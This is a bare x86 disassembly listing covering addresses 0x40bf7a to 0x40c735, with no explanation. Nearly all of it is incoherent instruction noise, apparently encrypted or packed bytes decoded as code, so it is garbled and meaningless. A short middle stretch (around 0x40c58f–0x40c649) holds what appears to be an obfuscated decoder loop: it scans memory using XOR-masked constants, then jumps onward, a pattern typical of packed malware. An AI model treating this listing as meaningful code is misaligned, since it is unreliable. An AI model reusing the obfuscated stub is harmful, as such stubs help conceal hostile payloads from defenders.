  40bf7a:	aad    0x18
  40bf7c:	push   ecx
  40bf7d:	cmp    DWORD PTR [ecx+0xedfbab6],esi
  40bf83:	fdiv   QWORD PTR [edx+0x2a]
  40bf86:	push   ebx
  40bf87:	pop    esi
  40bf88:	jp     0x40bf66
  40bf8a:	mov    ecx,ebx
  40bf8c:	xchg   edi,eax
  40bf8d:	clc    
  40bf8e:	loop   0x40bfee
  40bf90:	arpl   WORD PTR [ebx+0x12836af9],ax
  40bf96:	cmp    esi,ebp
  40bf98:	ret    0xdf1e
  40bf9b:	fnstenv [edx+0x5eb072f2]
  40bfa1:	outs   dx,BYTE PTR ds:[esi]
  40bfa2:	(bad)  
  40bfa3:	mov    dx,cx
  40bfa6:	push   ss
  40bfa7:	jns    0x40bfd3
  40bfa9:	xor    al,0xd8
  40bfab:	shl    DWORD PTR [eax-0x1f],cl
  40bfae:	adc    BYTE PTR [ecx+0x52],dh
  40bfb1:	xlat   BYTE PTR ds:[ebx]
  40bfb2:	push   ds
  40bfb3:	mov    DWORD PTR [eax+0x765c2527],esi
  40bfb9:	mov    ebp,0x5951872e
  40bfbe:	adc    esi,0xffffffe1
  40bfc1:	or     esp,esp
  40bfc3:	hlt    
  40bfc4:	add    eax,0xb77fc9a9
  40bfc9:	aas    
  40bfca:	test   dh,bh
  40bfcc:	lahf   
  40bfcd:	daa    
  40bfce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfcf:	sahf   
  40bfd0:	or     DWORD PTR [edi],ebp
  40bfd2:	sbb    cl,ah
  40bfd4:	sub    BYTE PTR [esi-0x7d551cf7],al
  40bfda:	lea    eax,[ecx]
  40bfdc:	jbe    0x40c05c
  40bfde:	mov    ebp,0xb9cdb663
  40bfe3:	pushf  
  40bfe4:	inc    esi
  40bfe5:	sbb    BYTE PTR [esi],ch
  40bfe7:	icebp  
  40bfe8:	adc    al,0xc3
  40bfea:	xchg   edi,eax
  40bfeb:	jmp    0xdecc:0x3011f235
  40bff2:	outs   dx,DWORD PTR ds:[esi]
  40bff3:	adc    DWORD PTR [eax],esp
  40bff5:	or     ebx,DWORD PTR [eax+ecx*8-0x78]
  40bff9:	pop    edi
  40bffa:	xchg   DWORD PTR [esi-0x58],eax
  40bffd:	jno    0x40bfca
  40bfff:	adc    eax,0x341a0268
  40c004:	imul   ecx,ebx,0x9e669c71
  40c00a:	cmp    BYTE PTR [edx-0x7c],bh
  40c00d:	and    al,0x15
  40c00f:	and    bh,BYTE PTR [esi-0xe]
  40c012:	add    eax,DWORD PTR [edi-0x69]
  40c015:	jnp    0x40bfe3
  40c017:	dec    esp
  40c018:	mov    eax,ds:0xd3a823db
  40c01d:	mov    esi,0xf59c3857
  40c022:	xor    edi,DWORD PTR [ebx]
  40c024:	xchg   ebp,eax
  40c025:	push   ebp
  40c026:	mov    ecx,0x9d8c11e0
  40c02b:	push   ds
  40c02c:	adc    BYTE PTR [ecx],ah
  40c02e:	push   0xcd42ce9
  40c033:	(bad)  
  40c034:	inc    ecx
  40c035:	push   ebp
  40c036:	pop    eax
  40c037:	aaa    
  40c038:	jp     0x40bfbf
  40c03a:	jge    0x40c0b2
  40c03c:	fisub  WORD PTR [ebx-0x5bdf01c1]
  40c042:	cmp    esi,ecx
  40c044:	adc    DWORD PTR [ebp+0x4c],esp
  40c047:	arpl   WORD PTR [esi+0x2c],dx
  40c04a:	xchg   ebx,eax
  40c04b:	enter  0xa43c,0xdc
  40c04f:	pop    edi
  40c050:	mov    dl,0x1f
  40c052:	lea    ebp,[esi]
  40c054:	xchg   ebp,eax
  40c055:	in     al,dx
  40c056:	fist   WORD PTR [esi+0x15]
  40c059:	test   al,0xde
  40c05b:	xor    BYTE PTR [esi+edx*8+0x47afdf],0x7c
  40c063:	fwait
  40c064:	or     al,0x5c
  40c066:	jno    0x40c060
  40c068:	mov    ds:0xf90f798b,eax
  40c06d:	fsubp  st(3),st
  40c06f:	mov    dh,0xab
  40c071:	mov    ah,0x95
  40c073:	leave  
  40c074:	xchg   dl,cl
  40c076:	xlat   BYTE PTR ds:[ebx]
  40c077:	in     eax,0x58
  40c079:	jl     0x40c05d
  40c07b:	inc    ecx
  40c07c:	jecxz  0x40c07b
  40c07e:	or     ebx,DWORD PTR [ebx+0x59b8edfe]
  40c084:	pop    ds
  40c085:	mul    BYTE PTR [edx]
  40c087:	xchg   edx,eax
  40c088:	fucomi st,st(0)
  40c08a:	inc    ebp
  40c08b:	outs   dx,DWORD PTR ds:[esi]
  40c08c:	adc    BYTE PTR [esi+0x76],bh
  40c08f:	xchg   DWORD PTR [edi+edi*1+0x1e8362b6],ecx
  40c096:	ss jg  0x40c03f
  40c099:	xchg   ebx,eax
  40c09a:	jae    0x40c0de
  40c09c:	imul   bl
  40c09e:	repz shl DWORD PTR [ebp+0x3e],cl
  40c0a2:	xlat   BYTE PTR ds:[ebx]
  40c0a3:	mov    ah,0x7f
  40c0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0a6:	aad    0xbf
  40c0a8:	sti    
  40c0a9:	les    edi,FWORD PTR [edi]
  40c0ab:	outs   dx,DWORD PTR ds:[esi]
  40c0ac:	pop    ecx
  40c0ad:	push   edx
  40c0ae:	mov    ecx,eax
  40c0b0:	js     0x40c0e9
  40c0b2:	sbb    eax,0xb699ccf
  40c0b7:	mov    al,ds:0x4970b56
  40c0bc:	inc    esi
  40c0bd:	in     eax,0x5d
  40c0bf:	sbb    eax,0x2f12de70
  40c0c4:	out    dx,al
  40c0c5:	test   al,0x77
  40c0c7:	mov    DWORD PTR [ebp+0x24a7a07f],eax
  40c0cd:	push   ebx
  40c0ce:	sbb    eax,0x6398b0d5
  40c0d3:	xlat   BYTE PTR ds:[ebx]
  40c0d4:	sub    DWORD PTR [edi],eax
  40c0d6:	pop    edx
  40c0d7:	hlt    
  40c0d8:	gs mov ecx,0x801d055c
  40c0de:	rol    BYTE PTR [esi],0x8d
  40c0e1:	adc    eax,0x5c9f50da
  40c0e6:	ret    0xb2c9
  40c0e9:	call   0xab01b5d8
  40c0ee:	cmp    bh,dh
  40c0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0f1:	jmp    0x6a35:0xf53dc05
  40c0f8:	sbb    al,0xff
  40c0fa:	inc    ebx
  40c0fb:	es push es
  40c0fd:	dec    ebp
  40c0fe:	loop   0x40c15e
  40c100:	cmp    al,0xb6
  40c102:	lods   eax,DWORD PTR ds:[esi]
  40c103:	pop    DWORD PTR [edx+0x17]
  40c106:	jg     0x40c12e
  40c108:	into   
  40c109:	xchg   esp,eax
  40c10a:	repnz sbb eax,0x61ff0b78
  40c110:	ror    edi,cl
  40c112:	mov    DWORD PTR [ecx],ebx
  40c114:	push   edi
  40c115:	mov    al,0xf8
  40c117:	sbb    eax,DWORD PTR [ebp+ecx*2-0x70]
  40c11b:	pop    ebx
  40c11c:	lods   al,BYTE PTR ds:[esi]
  40c11d:	mov    ds:0xd5715c6,eax
  40c122:	cmp    dl,BYTE PTR [ebp+0x2a1f31fb]
  40c128:	dec    esp
  40c129:	fs jge 0x40c189
  40c12c:	xchg   esi,eax
  40c12d:	ins    DWORD PTR es:[edi],dx
  40c12e:	inc    ecx
  40c12f:	loop   0x40c0ce
  40c131:	pop    esi
  40c132:	mov    eax,ds:0xd922d306
  40c137:	data16 or BYTE PTR ds:0x6a15cdb4,0x3
  40c13f:	imul   esp,DWORD PTR [esi+0x19],0x3dfe4568
  40c146:	cld    
  40c147:	inc    sp
  40c149:	rcl    BYTE PTR [ecx+0x20ef7387],cl
  40c14f:	in     al,0xc6
  40c151:	std    
  40c152:	dec    ecx
  40c153:	adc    eax,0xfa39f7f1
  40c158:	cli    
  40c159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15a:	xchg   ebx,eax
  40c15b:	fisubr DWORD PTR [ecx+ebx*1-0x4260fd1c]
  40c162:	cdq    
  40c163:	fwait
  40c164:	adc    bh,BYTE PTR [eax-0x71c36742]
  40c16a:	fs push esp
  40c16c:	sar    BYTE PTR [edi-0x3c437a97],cl
  40c172:	rol    edx,cl
  40c174:	xchg   edi,eax
  40c175:	pop    esp
  40c176:	scas   eax,DWORD PTR es:[edi]
  40c177:	xchg   ecx,eax
  40c178:	shr    DWORD PTR [si],0x87
  40c17c:	mov    esi,0xb244d54d
  40c181:	je     0x40c1a8
  40c183:	iret   
  40c184:	cs dec esi
  40c186:	psrlq  mm4,QWORD PTR [esi+0x3]
  40c18a:	icebp  
  40c18b:	push   esi
  40c18c:	pop    ecx
  40c18d:	rcr    BYTE PTR [edi-0x66ecfb10],cl
  40c193:	mov    ds:0x5dc226e8,eax
  40c198:	adc    DWORD PTR [ecx],0xfcfa9190
  40c19e:	enter  0xa235,0x31
  40c1a2:	data16 mov WORD PTR [edx-0x5b],?
  40c1a6:	sahf   
  40c1a7:	int3   
  40c1a8:	push   edi
  40c1a9:	pop    ebp
  40c1aa:	in     al,0xb3
  40c1ac:	es cmp eax,ebp
  40c1af:	xchg   ecx,eax
  40c1b0:	jecxz  0x40c155
  40c1b2:	lds    edi,FWORD PTR [edi-0x16]
  40c1b5:	xor    ecx,DWORD PTR [ebx+ecx*1-0x6862325e]
  40c1bc:	in     eax,dx
  40c1bd:	jne    0x40c1a9
  40c1bf:	jo     0x40c180
  40c1c1:	in     al,dx
  40c1c2:	aaa    
  40c1c3:	inc    esp
  40c1c4:	or     dh,BYTE PTR [edx+0x1d]
  40c1c7:	mov    ebp,0xd8677d26
  40c1cc:	test   eax,0xf212a1e6
  40c1d1:	push   es
  40c1d2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40c1d4:	mov    eax,0x7e82a71d
  40c1d9:	in     eax,0x5d
  40c1db:	(bad)  
  40c1dc:	mov    dl,0x4f
  40c1de:	add    BYTE PTR [esi-0x7d],ch
  40c1e1:	gs mov eax,0x93f3d8b3
  40c1e7:	lds    esi,FWORD PTR [edx+ebp*1+0x71]
  40c1eb:	push   esp
  40c1ec:	adc    al,0xd
  40c1ee:	and    DWORD PTR [ebx+0x23],ebx
  40c1f1:	push   0xffffffa0
  40c1f3:	sahf   
  40c1f4:	adc    eax,0xad9a42ed
  40c1f9:	ret    
  40c1fa:	fwait
  40c1fb:	add    bl,ch
  40c1fd:	adc    BYTE PTR [ecx-0x7a],bh
  40c200:	mov    DWORD PTR [ebx-0x3d4530b8],ecx
  40c206:	idiv   cl
  40c208:	sub    dl,BYTE PTR [ebx+ebp*4]
  40c20b:	cwde   
  40c20c:	and    al,0x2e
  40c20e:	aam    0x63
  40c210:	imul   ebp,DWORD PTR [ebx-0x17],0xdd71c153
  40c217:	cdq    
  40c218:	aad    0x38
  40c21a:	sbb    bl,BYTE PTR [eax]
  40c21c:	repnz sahf 
  40c21e:	mov    ecx,0xc6255830
  40c223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c224:	sbb    al,0xfa
  40c226:	popa   
  40c227:	scas   eax,DWORD PTR es:[edi]
  40c228:	push   eax
  40c229:	sub    al,0x73
  40c22b:	pop    esp
  40c22c:	test   al,0x65
  40c22e:	std    
  40c22f:	xlat   BYTE PTR ds:[ebx]
  40c230:	mov    cl,0x70
  40c232:	pop    esi
  40c233:	dec    ebp
  40c234:	adc    eax,0xe9671e29
  40c239:	xchg   edx,eax
  40c23a:	sub    bl,BYTE PTR [esi]
  40c23c:	ja     0x40c26f
  40c23e:	or     al,0x31
  40c240:	les    esi,FWORD PTR [ecx]
  40c242:	mov    ch,0x6
  40c244:	outs   dx,BYTE PTR ds:[esi]
  40c245:	popf   
  40c246:	cmp    DWORD PTR [edx-0x6f],0x5e
  40c24a:	xor    cl,bl
  40c24c:	lahf   
  40c24d:	retf   0x4beb
  40c250:	and    ebp,DWORD PTR [ecx-0x701d0ff7]
  40c256:	xor    DWORD PTR ds:0x858abd11,eax
  40c25c:	daa    
  40c25d:	sbb    esi,edx
  40c25f:	cmp    BYTE PTR [edx+0x5dc0d9e8],0xec
  40c266:	adc    bl,bh
  40c268:	adc    DWORD PTR [edx+0x7a704500],edx
  40c26e:	add    al,0x2d
  40c270:	outs   dx,BYTE PTR gs:[esi]
  40c272:	sahf   
  40c273:	jecxz  0x40c2b7
  40c275:	mov    bh,dh
  40c277:	loop   0x40c1fb
  40c279:	push   edi
  40c27a:	add    eax,0x3ee79c7a
  40c27f:	xor    al,0x10
  40c282:	lods   al,BYTE PTR ds:[esi]
  40c283:	out    0x5,al
  40c285:	clc    
  40c286:	inc    BYTE PTR [ebx-0x5caa10c]
  40c28c:	dec    edi
  40c28d:	jl     0x40c219
  40c28f:	out    dx,eax
  40c290:	rcl    DWORD PTR [edx+0x5090dfa1],1
  40c296:	(bad)  
  40c297:	xor    dh,BYTE PTR [edi]
  40c299:	inc    ebx
  40c29a:	adc    DWORD PTR [edi],esi
  40c29c:	sub    eax,0x24f52464
  40c2a1:	repz push 0xe5987b04
  40c2a7:	jecxz  0x40c2f4
  40c2a9:	or     ch,ch
  40c2ab:	lahf   
  40c2ac:	jp     0x40c27a
  40c2ae:	sub    eax,esp
  40c2b0:	loopne 0x40c298
  40c2b2:	push   eax
  40c2b3:	retf   0x2eef
  40c2b6:	pop    ecx
  40c2b7:	jge    0x40c303
  40c2b9:	inc    esp
  40c2ba:	adc    al,0x6c
  40c2bc:	fisub  WORD PTR [edx+0x74d6f301]
  40c2c2:	fldenv [ecx+0x5b]
  40c2c5:	(bad)  
  40c2c6:	shr    BYTE PTR [esp+edx*8],1
  40c2c9:	pushf  
  40c2ca:	fldl2e 
  40c2cc:	dec    eax
  40c2cd:	cwde   
  40c2ce:	pop    edx
  40c2cf:	test   DWORD PTR [eax-0x38114549],edi
  40c2d5:	mov    WORD PTR [edi+0x52],es
  40c2d8:	arpl   WORD PTR [eax+0x70d5ae18],bx
  40c2de:	add    edi,ebx
  40c2e0:	call   0x685ac5
  40c2e5:	sbb    eax,0x7582ee4c
  40c2ea:	leave  
  40c2eb:	adc    eax,0xb7edb5b5
  40c2f0:	fisubr WORD PTR [esp+edi*1+0x78]
  40c2f4:	or     bh,al
  40c2f6:	add    eax,0xf298da8c
  40c2fb:	jmp    0xf888:0x91a1deed
  40c302:	adc    dh,BYTE PTR fs:[edi]
  40c305:	loop   0x40c2ad
  40c307:	out    dx,al
  40c308:	mov    dl,dl
  40c30a:	fcom   st(3)
  40c30c:	cld    
  40c30d:	leave  
  40c30e:	das    
  40c30f:	popf   
  40c310:	mov    dh,0x3f
  40c312:	adc    DWORD PTR [ecx+eiz*8+0x331513c9],0x91c4d5ba
  40c31d:	rcr    BYTE PTR ds:0xf35d3daf,0xfd
  40c324:	mov    DWORD PTR [ebp-0x17],0x9afc4e91
  40c32b:	pop    edi
  40c32c:	cmc    
  40c32d:	sti    
  40c32e:	or     DWORD PTR [edx+0x2d416dc3],ecx
  40c334:	mov    ecx,0xcec64e0c
  40c339:	and    BYTE PTR [eax-0x65],0xe6
  40c33d:	fadd   st,st(5)
  40c33f:	addr16 push esi
  40c341:	mov    eax,ss
  40c343:	out    dx,al
  40c344:	aas    
  40c345:	retf   0x87e6
  40c348:	jl     0x40c32d
  40c34a:	jecxz  0x40c370
  40c34c:	jno    0x40c3ad
  40c34e:	adc    edx,DWORD PTR [esi+0x72ea5ebb]
  40c354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c355:	jno    0x40c333
  40c357:	xchg   esi,eax
  40c358:	sub    DWORD PTR [ebx+0x76],edx
  40c35b:	mov    bl,0x52
  40c35d:	aam    0xff
  40c35f:	aaa    
  40c360:	inc    esp
  40c361:	ja     0x40c3c0
  40c363:	ja     0x40c319
  40c365:	adc    eax,0xcc3cbb77
  40c36a:	aaa    
  40c36b:	xor    eax,0x188bcf09
  40c370:	inc    ecx
  40c371:	popa   
  40c372:	repz inc esi
  40c374:	jae    0x40c2fa
  40c376:	pop    ebx
  40c377:	popf   
  40c378:	add    BYTE PTR [esi+0x3a],ch
  40c37b:	fisttp WORD PTR [ecx-0xb513cc8]
  40c381:	loop   0x40c397
  40c383:	stc    
  40c384:	xchg   cl,bl
  40c386:	addr16 jle 0x40c3e3
  40c389:	hlt    
  40c38a:	(bad)  
  40c38c:	mov    ds:0xd43c489d,al
  40c391:	ret    0x23fe
  40c394:	push   esi
  40c395:	nop
  40c396:	inc    edx
  40c397:	jge    0x40c38d
  40c399:	inc    eax
  40c39a:	js     0x40c37c
  40c39c:	ins    BYTE PTR es:[edi],dx
  40c39d:	enter  0xc969,0xc4
  40c3a1:	mov    WORD PTR [ebx+0x11],ss
  40c3a4:	sbb    BYTE PTR [edx],0xbe
  40c3a7:	inc    edx
  40c3a8:	faddp  st(2),st
  40c3aa:	push   ss
  40c3ab:	scas   eax,DWORD PTR es:[edi]
  40c3ac:	mov    ch,0xf4
  40c3ae:	dec    esi
  40c3af:	ds cli 
  40c3b1:	stc    
  40c3b2:	xor    BYTE PTR [ecx-0x24],dl
  40c3b5:	stos   DWORD PTR es:[edi],eax
  40c3b6:	xchg   edx,eax
  40c3b7:	shr    BYTE PTR [ebx+0x6976f662],0x16
  40c3be:	je     0x40c38b
  40c3c0:	sbb    eax,0xc707aa7e
  40c3c5:	(bad)  
  40c3c6:	int3   
  40c3c7:	lea    ebx,[ebx-0x2d5f2dea]
  40c3cd:	push   0x5aba4f56
  40c3d2:	jb     0x40c377
  40c3d4:	mov    cl,dl
  40c3d6:	outs   dx,DWORD PTR ds:[esi]
  40c3d7:	jbe    0x40c407
  40c3d9:	shr    DWORD PTR [esp+esi*4-0x69],cl
  40c3dd:	push   ss
  40c3de:	pop    ecx
  40c3df:	in     al,dx
  40c3e0:	mov    edx,0x8d907837
  40c3e5:	fsubr  st(1),st
  40c3e7:	mov    esi,0xa57dc9c0
  40c3ec:	add    DWORD PTR [ecx+ecx*8+0x317719b6],0xffffffde
  40c3f4:	fild   QWORD PTR [ebx]
  40c3f6:	call   0x4bce:0xa451699
  40c3fd:	mov    bl,0x65
  40c3ff:	cld    
  40c400:	in     al,dx
  40c401:	jp     0x40c471
  40c403:	ret    0x9b30
  40c406:	push   eax
  40c407:	mov    bp,0xf5a8
  40c40b:	mov    esi,0x9f722394
  40c410:	mul    DWORD PTR [eax]
  40c412:	or     BYTE PTR [edx-0x4b93d079],ch
  40c418:	and    al,0xdd
  40c41a:	fdiv   DWORD PTR [edi+ebp*1+0x68a15c22]
  40c421:	jae    0x40c415
  40c423:	mov    ebp,cs
  40c425:	or     ebx,DWORD PTR [ecx+0xa]
  40c428:	mov    al,ds:0x415daaa9
  40c42d:	add    DWORD PTR [edx+0x4e],ecx
  40c430:	mov    bh,0x4d
  40c432:	mov    ecx,0x6eb57b8f
  40c437:	sub    ebp,edi
  40c439:	scas   eax,DWORD PTR es:[edi]
  40c43a:	clc    
  40c43b:	(bad)  
  40c43c:	sub    al,0x43
  40c43e:	test   BYTE PTR ds:0xd30fd5da,bl
  40c444:	jb     0x40c44b
  40c446:	ins    BYTE PTR es:[edi],dx
  40c447:	out    0x6c,eax
  40c449:	mov    dh,BYTE PTR [edx+0x54f49adb]
  40c44f:	dec    esi
  40c450:	push   ss
  40c451:	cwde   
  40c452:	div    BYTE PTR [eax]
  40c454:	xchg   edx,eax
  40c455:	jae    0x40c43e
  40c457:	test   ch,dl
  40c459:	sbb    BYTE PTR [eax-0x18cab413],cl
  40c45f:	repz dec ebp
  40c461:	add    BYTE PTR [edi+0x4b],0xf8
  40c465:	mov    eax,0x8a4127d8
  40c46a:	enter  0xcc26,0x2a
  40c46e:	push   ebx
  40c46f:	imul   eax,DWORD PTR [ecx+0x42],0x5d9d7152
  40c476:	es je  0x40c4db
  40c479:	jmp    0xc6151a30
  40c47e:	sbb    eax,0xb794313e
  40c483:	popf   
  40c484:	imul   eax,DWORD PTR [ecx],0xe0b0ec14
  40c48a:	dec    edx
  40c48b:	in     eax,dx
  40c48c:	add    BYTE PTR fs:[eax-0x44],0x95
  40c491:	int    0x47
  40c493:	mov    dl,0xe8
  40c495:	mov    ah,0xc2
  40c497:	pop    ss
  40c498:	stos   DWORD PTR es:[edi],eax
  40c499:	pop    esi
  40c49a:	pmullw mm6,QWORD PTR [esi+0x62]
  40c49e:	xchg   esi,eax
  40c49f:	jb     0x40c4b0
  40c4a1:	xlat   BYTE PTR ds:[ebx]
  40c4a2:	daa    
  40c4a3:	shr    DWORD PTR [eax-0x686acff2],0xdd
  40c4aa:	loope  0x40c509
  40c4ac:	and    al,0xb3
  40c4ae:	and    dl,BYTE PTR [eax+0x4a]
  40c4b1:	in     al,0x3a
  40c4b3:	fucomp st(3)
  40c4b5:	in     eax,dx
  40c4b6:	mov    ah,0xf6
  40c4b8:	or     eax,0x4dbc9d0d
  40c4bd:	xor    eax,0xd9331a16
  40c4c2:	ficom  DWORD PTR [ebx]
  40c4c4:	ja     0x40c4ae
  40c4c6:	mov    bl,0xac
  40c4c8:	in     eax,dx
  40c4c9:	ss out 0x81,eax
  40c4cc:	daa    
  40c4cd:	pop    es
  40c4ce:	jmp    0x3461291e
  40c4d3:	out    dx,al
  40c4d4:	push   edi
  40c4d5:	mov    edi,0x8e8836e9
  40c4da:	or     ecx,ebx
  40c4dc:	adc    al,0x97
  40c4de:	pushf  
  40c4df:	addr16 popa 
  40c4e1:	sub    DWORD PTR [ecx],esi
  40c4e3:	and    al,0x3b
  40c4e5:	shl    DWORD PTR [ebx],0x5a
  40c4e8:	push   0xffffffc8
  40c4ea:	pop    eax
  40c4eb:	pop    ebp
  40c4ec:	(bad)  
  40c4ed:	out    dx,eax
  40c4ee:	gs icebp 
  40c4f0:	sti    
  40c4f1:	imul   esi,edi,0x4c18cb18
  40c4f7:	jo     0x40c4dc
  40c4f9:	dec    ebx
  40c4fa:	push   ds
  40c4fb:	fs std 
  40c4fd:	lock outs dx,DWORD PTR ds:[esi]
  40c4ff:	jae    0x40c4da
  40c501:	das    
  40c502:	xor    bl,bh
  40c504:	test   eax,0x2bdf63dc
  40c509:	loop   0x40c51b
  40c50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c50c:	loopne 0x40c4aa
  40c50e:	or     al,0x5
  40c510:	iret   
  40c511:	ret    0x4f7d
  40c514:	xor    al,al
  40c516:	fidivr DWORD PTR ds:0xf18cce4f
  40c51c:	gs pop es
  40c51e:	adc    eax,0xa6a64c41
  40c523:	cmp    cl,BYTE PTR [ecx]
  40c525:	(bad)  
  40c526:	or     al,al
  40c528:	mov    DWORD PTR [ebp+0x4c],ebx
  40c52b:	(bad)  [ebp+0x440d3d23]
  40c531:	popa   
  40c532:	out    dx,al
  40c533:	sub    BYTE PTR [edi+edi*1],0xb9
  40c537:	aas    
  40c538:	xor    al,0x45
  40c53a:	cmc    
  40c53b:	ror    ch,1
  40c53d:	adc    DWORD PTR [edi+0x3105cbc7],esp
  40c543:	int    0x71
  40c545:	dec    edx
  40c546:	add    eax,0x69abe733
  40c54b:	sahf   
  40c54c:	rcl    DWORD PTR [esi],0x97
  40c54f:	xor    al,0x83
  40c551:	cld    
  40c552:	sbb    eax,0x620ca3e2
  40c557:	xor    bh,BYTE PTR [edx]
  40c559:	std    
  40c55a:	push   0x7f000e72
  40c55f:	sub    DWORD PTR [edx+0x3c],edx
  40c562:	xchg   esi,eax
  40c563:	clc    
  40c564:	mov    bl,0x8b
  40c566:	out    dx,eax
  40c567:	jg     0x40c592
  40c569:	or     al,0x1b
  40c56b:	mov    ah,0x90
  40c56d:	call   0xa7f8:0xba70b8a9
  40c574:	bound  eax,QWORD PTR [ebp+0x4b288690]
  40c57a:	adc    eax,0xf355ca2e
  40c57f:	push   edi
  40c580:	imul   esi,DWORD PTR [edx],0xffffffcc
  40c583:	or     BYTE PTR [eax],bl
  40c585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c586:	rcl    bl,1
  40c588:	push   ebp
  40c589:	outs   dx,BYTE PTR ds:[esi]
  40c58a:	mov    eax,ds:0x3ebdfe2
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xd74b873c
  40c65b:	leave  
  40c65c:	lahf   
  40c65d:	xchg   ecx,eax
  40c65e:	mov    ds:0x4e7c7ce0,al
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	adc    eax,0x9e70e4e3
  40c66b:	push   ss
  40c66c:	scas   eax,DWORD PTR es:[edi]
  40c66d:	shr    DWORD PTR [edi],cl
  40c66f:	imul   ecx,DWORD PTR [edx],0xffffffc7
  40c672:	lock sbb al,BYTE PTR [esi-0x31]
  40c676:	add    DWORD PTR [esi-0x1349b7d6],0xba5c3ddc
  40c680:	xchg   edx,eax
  40c681:	adc    al,BYTE PTR [esi+0x450aba1f]
  40c687:	and    bh,BYTE PTR [ecx+eiz*4]
  40c68a:	jmp    0xf546bf84
  40c68f:	enter  0x7d04,0xcb
  40c693:	jmp    0x28241025
  40c698:	psubq  mm3,mm0
  40c69b:	sbb    al,0x1e
  40c69d:	mov    ds:0xd530d760,al
  40c6a2:	out    dx,al
  40c6a3:	add    al,0xac
  40c6a5:	jo     0x40c71f
  40c6a7:	mov    al,ds:0xe1c0e004
  40c6ac:	mov    cl,0x76
  40c6ae:	mov    ch,0x4d
  40c6b0:	ins    DWORD PTR es:[edi],dx
  40c6b1:	in     al,dx
  40c6b2:	and    DWORD PTR [ebx+0x74],ecx
  40c6b5:	lods   al,BYTE PTR ds:[esi]
  40c6b6:	iret   
  40c6b7:	ror    BYTE PTR [edx-0x2c],cl
  40c6ba:	adc    DWORD PTR [edx-0x471defbe],esi
  40c6c0:	sahf   
  40c6c1:	aaa    
  40c6c2:	pop    es
  40c6c3:	xor    DWORD PTR [ecx-0x7d331e5f],esp
  40c6c9:	mov    WORD PTR [edx+0x7b],es
  40c6cc:	das    
  40c6cd:	retf   0xecff
  40c6d0:	es lock in al,0x11
  40c6d4:	scas   al,BYTE PTR es:[edi]
  40c6d5:	outs   dx,DWORD PTR ds:[esi]
  40c6d6:	adc    DWORD PTR [edx+0x66],0xe50a2f32
  40c6dd:	jmp    0x8b2390aa
  40c6e2:	pop    eax
  40c6e3:	adc    edx,ebx
  40c6e5:	dec    ebp
  40c6e6:	or     esp,DWORD PTR [ebp+0x34]
  40c6e9:	mov    BYTE PTR ds:0x70bdef83,al
  40c6ef:	jmp    0x579f:0xb945bbb4
  40c6f6:	mov    WORD PTR [bx+0x402f],gs
  40c6fb:	popa   
  40c6fc:	loopne 0x40c70b
  40c6fe:	pop    ebx
  40c6ff:	call   0x135:0x98577e74
  40c706:	adc    eax,DWORD PTR [ebx]
  40c708:	jmp    0x40c691
  40c70a:	push   0x33ada0be
  40c70f:	repnz lea esp,[ecx]
  40c712:	repnz add eax,DWORD PTR [ecx-0x2935be94]
  40c719:	mov    dh,0x74
  40c71b:	sbb    ebp,ecx
  40c71d:	nop
  40c71e:	dec    ecx
  40c71f:	mov    bl,0xca
  40c721:	stos   DWORD PTR es:[edi],eax
  40c722:	mov    ds:0x1ee0c58,al
  40c727:	sub    ebx,esp
  40c729:	int3   
  40c72a:	sar    BYTE PTR [ebp+0x544ff80],0x1d
  40c731:	js     0x40c6cf
  40c733:	int3   
  40c734:	cwde   
  40c735:	ds add esp,eax
